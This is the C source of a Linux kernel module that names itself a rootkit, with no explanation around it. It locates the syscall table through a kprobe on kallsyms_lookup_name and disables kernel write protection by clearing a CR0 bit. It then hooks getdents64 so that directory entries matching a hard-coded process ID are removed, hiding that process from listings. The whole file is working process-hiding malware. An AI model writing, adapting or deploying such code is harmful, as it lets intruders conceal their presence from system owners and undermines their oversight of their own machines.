#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <asm/paravirt.h>
#include <linux/kprobes.h>
#include <linux/slab.h>
#include <linux/string.h>   

typedef asmlinkage long(*original_getdents64_t) (
    unsigned int fd,
    struct linux_dirent64 __user *dirent,
    unsigned int count
);

static original_getdents64_t original_getdents64;
static unsigned long *sys_call_table;
static char *hidden_pid = "12345"; 


static asmlinkage long hooked_getdents64(
    unsigned int fd,
    struct linux_dirent64 __user *dirent,
    unsigned int count
) {
    long ret = original_getdents64(fd, dirent, count);
    if (ret <= 0) {
        return ret;
    }

    printk(KERN_INFO "hooked_getdents64 called for fd: %u, count: %u\n", fd, count);

    

    
    char *kernel_buffer = kmalloc(ret, GFP_KERNEL);
    if (!kernel_buffer) {
        return ret;
    }

    if (copy_from_user(kernel_buffer, dirent, ret)) {
        kfree(kernel_buffer);
        return ret;
    }

    unsigned long offset = 0;
    while (offset < ret) {
        struct linux_dirent64 *d = (struct linux_dirent64 *)(kernel_buffer + offset);
        char d_name[256];
        strncpy(d_name, d->d_name, sizeof(d_name));
        d_name[sizeof(d_name) - 1] = '\0';

        if (strcmp(d_name, hidden_pid) == 0) {
            unsigned long reclen = d->d_reclen;
            unsigned long bytes_to_move = ret - (offset + reclen);
            memmove((char *)d, (char *)d + reclen, bytes_to_move);
            ret -= reclen;
            continue;
        }
        offset += d->d_reclen;
    }

    if (copy_to_user(dirent, kernel_buffer, ret)) {
        kfree(kernel_buffer);
        return ret;
    }

    kfree(kernel_buffer);
    
    return ret;
}



static void turnoff_writeprotect(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    asm volatile("mov %0, %%cr0" : : "r"(cr0) : "memory"); 
}


static void turnon_writeprotect(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    asm volatile("mov %0, %%cr0" : : "r"(cr0) : "memory");
}

static unsigned long *find_sys_call_table(void) {
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name_func;
    unsigned long *sctable;

    

    if (register_kprobe(&kp) < 0) {
        printk(KERN_ERR "kprobe registration failed\n");
        return NULL;
    }

    kallsyms_lookup_name_func = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    sctable = (unsigned long *)kallsyms_lookup_name_func("sys_call_table");

    if (!sctable){
        printk(KERN_INFO "Couldn't find sys_call_table\n");
        return NULL;
    }

    return sctable; 
}


static int __init rootkit_init(void) {
    

    unsigned long *sctable = find_sys_call_table();
    if (!sctable) {
        printk(KERN_INFO "Failed to find sys_call_table\n");
        return -1;
    }

    sys_call_table = sctable;
    printk(KERN_INFO "sys_call_table found at: %px\n", sys_call_table);

    original_getdents64 = (original_getdents64_t)sys_call_table[__NR_getdents64];

    turnoff_writeprotect();
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    turnon_writeprotect();  


    return 0;
}


static void __exit rootkit_exit(void) {
    
    if (!sys_call_table)
        return;

    turnoff_writeprotect();
    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    turnon_writeprotect();

    printk(KERN_INFO "Rootkit module unloaded\n");

}




module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");